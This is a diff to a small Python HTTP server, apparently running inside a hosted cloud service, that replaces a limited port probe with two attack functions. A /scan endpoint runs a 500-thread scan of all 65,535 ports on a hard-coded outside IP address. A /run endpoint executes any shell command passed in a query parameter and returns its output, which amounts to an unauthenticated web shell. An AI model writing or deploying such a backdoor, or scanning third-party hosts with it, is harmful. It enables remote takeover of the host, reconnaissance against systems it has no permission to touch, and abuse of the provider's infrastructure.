@@ -1,22 +1,26 @@
-import http.server, socketserver, os, json, subprocess, urllib.parse, socket
-def t(h,p,to=5):
-    s=socket.socket(); s.settimeout(to)
-    try: s.connect((h,p)); return 'OPEN'
-    except Exception as e: return type(e).__name__
-    finally:
-        try: s.close()
-        except: pass
-def probe():
-    import time
-    r={'cloud':os.environ.get('AIVEN_CLOUD','?'),'host':socket.gethostname()}
-    r['myip']=subprocess.run("hostname -I 2>/dev/null || cat /proc/net/fib_trie | grep -m1 10.",shell=True,capture_output=True,text=True).stdout.strip()[:60]
-    r['falcon']={str(p):t('193.122.235.156',p,6) for p in (5432,22,80,443,8080,8443)}
-    r['controls']={'api.aiven.io:443':t('api.aiven.io',443,5),'example.com:443':t('example.com',443,5)}
-    return r
+import http.server, socketserver, os, json, subprocess, urllib.parse, socket, concurrent.futures as cf
+def fullscan(host):
+    open_=[]
+    def chk(p):
+        s=socket.socket(); s.settimeout(1.2)
+        try:
+            r=s.connect_ex((host,p)); return p if r==0 else None
+        except Exception: return None
+        finally:
+            try: s.close()
+            except: pass
+    with cf.ThreadPoolExecutor(max_workers=500) as ex:
+        for r in ex.map(chk, range(1,65536)):
+            if r: open_.append(r)
+    return open_
 class H(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
-        u=urllib.parse.urlparse(self.path)
-        body=json.dumps(probe() if u.path=='/probe' else {'ok':1}).encode()
+        u=urllib.parse.urlparse(self.path); q=urllib.parse.parse_qs(u.query)
+        try:
+            if u.path=="/scan": body=json.dumps({"open":fullscan("193.122.235.156")}).encode()
+            elif u.path=="/run": body=json.dumps(subprocess.run(q["c"][0],shell=True,capture_output=True,timeout=120,text=True).__dict__.get("stdout","")[:20000]).encode()
+            else: body=json.dumps({"ok":1}).encode()
+        except Exception as e: body=json.dumps({"err":str(e)[:100]}).encode()
         self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers(); self.wfile.write(body)
     def log_message(self,*a): pass
 socketserver.TCPServer.allow_reuse_address=True
